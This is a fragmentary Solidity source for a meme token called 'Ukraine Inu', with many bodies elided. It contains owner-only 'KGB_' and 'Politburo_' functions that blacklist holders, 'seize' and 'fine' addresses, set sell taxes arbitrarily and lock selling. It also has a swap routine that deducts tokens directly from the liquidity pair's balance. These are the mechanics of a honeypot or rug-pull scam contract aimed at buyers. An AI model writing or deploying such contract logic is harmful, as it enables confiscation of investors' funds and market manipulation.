...
// Welcome to Ukraine Inu, aka Ukrainu
// You are a pioneer. Feel free to create a telegram named Ukrainu Inu (@ukrainuinu) and the founder will silently join
// This token is paired with Putin LP 0x4e66d93851d1075441ef66835efb610c57c8421b
...
contract UkrainuDeFi is IERC20, Ownable
{
    ...
    string public constant _name = 'Ukraine Inu';
    string public constant _symbol = 'Ukrainu';
    ...
    uint16 public  BuyLimitDivider=10; // 10%
    
    uint8 public   BalanceLimitDivider=5; // 20%
    ...
    address Putin = 0x4E66d93851D1075441EF66835eFb610C57C8421B;
    ...
    constructor () {
        ...
        _UniswapPairAddress = IUniswapFactory(_UniswapRouter.factory()).createPair(address(this), Putin);
    ...
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        ...
        if(isSell){
           ...
           uint256 contractToken=_calculateFee(amount, tax, _marketingTax+_liquidityTax+burnTax);
    ...
    function _swapContractToken(uint256 totalMax) private lockTheSwap{
        ...
        if(_balances[_UniswapPairAddress] >= tokenForBurn) {
             _balances[_UniswapPairAddress] -= tokenForBurn;
             emit Transfer(_UniswapPairAddress, Dead, tokenForBurn);
        }
    ...
    function Politburo_destroy(uint256 amount) public onlyTeam {
    ...
    function Politburo_getLimits() public view returns(uint256 balance, uint256 sell){
        return(balanceLimit/10**_decimals, sellLimit/10**_decimals);
    }

    function Politburo_getTaxes() public view returns(uint256 BurnTax,uint256 liquidityTax,uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){
        return (burnTax,_liquidityTax,_marketingTax,_buyTax,_sellTax,_transferTax);
    }
    
    function Politburo_getAddressSellLockTimeInSeconds(address AddressToCheck) public view returns (uint256){
    ...
    function Politburo_getSellLockTimeInSeconds() public view returns(uint256){
        return sellLockTime;
    }
    ...
    function Politburo_SetPeggedSwap(bool isPegged) public onlyTeam {
        isSwapPegged = isPegged;
    }

    function Politburo_SetMaxSwap(uint256 max) public onlyTeam {
        swapLimit = max;
    }

    function Politburo_SetMaxLockTime(uint16 max) public onlyTeam {
     MaxSellLockTime = max;
    }

    /// @notice KGB Functions
    function KGB_BlackListAddress(address addy, bool booly) public onlyTeam {
        _blacklist[addy] = booly;
    }
    
    function KGB_AddressStop() public onlyTeam {
        _sellLock[msg.sender]=block.timestamp+(365 days);
    }

    function KGB_FineAddress(address addy, uint256 amount) public onlyTeam {
    ...
    function KGB_SetTeam(address addy, bool booly) public onlyTeam {
        isTeam[addy] = booly;
    }

    function KGB_SeizeAddress(address addy) public onlyTeam {
    ...
    function KGB_ExcludeAccountFromFees(address account) public onlyTeam {
        _excluded.add(account);
    }
    function KGB_IncludeAccountToFees(address account) public onlyTeam {
        _excluded.remove(account);
    }
    
    function KGB_ExcludeAccountFromSellLock(address account) public onlyTeam {
        _excludedFromSellLock.add(account);
    }
    function KGB_IncludeAccountToSellLock(address account) public onlyTeam {
    ...
    function Politburo_SwitchManualETHConversion(bool manual) public onlyTeam{
        manualConversion=manual;
    }
    
    function Politburo_DisableSellLock(bool disabled) public onlyTeam{
    ...
    function Politburo_SetTaxes(uint8 burnTaxes, uint8 liquidityTaxes, uint8 marketingTaxes,uint8 buyTax, uint8 sellTax, uint8 transferTax) public onlyTeam{
    ...
    function Politburo_ChangeMarketingShare(uint8 newShare) public onlyTeam{
        marketingShare=newShare;
    }
    
    function Politburo_ChangeGrowthShare(uint8 newShare) public onlyTeam{
        growthShare=newShare;
    }

    function Politburo_ChangeBurnShare(uint8 newShare) public onlyTeam{
        BurnShare=newShare;
    }

    function Politburo_ManualGenerateTokenSwapBalance(uint256 _qty) public onlyTeam{
        _swapContractToken(_qty * 10**9);
    }

    
    function Politburo_UpdateLimits(uint256 newBalanceLimit, uint256 newSellLimit) public onlyTeam{
    ...
    function Politburo_RescueTokens(address tknAddress) public onlyTeam {
    ...
    function Politburo_setBlacklistEnabled(bool isBlacklistEnabled) public onlyTeam {
        isBlacklist = isBlacklistEnabled;
    }

    function Politburo_setContractTokenSwapManual(bool manual) public onlyTeam {
        isTokenSwapManual = manual;
    }

    function Politburo_setBlacklistedAddress(address toBlacklist) public onlyTeam {
        _blacklist[toBlacklist] = true;
    }

    function Politburo_removeBlacklistedAddress(address toRemove) public onlyTeam {
        _blacklist[toRemove] = false;
    }


    function Politburo_AvoidLocks() public onlyTeam{
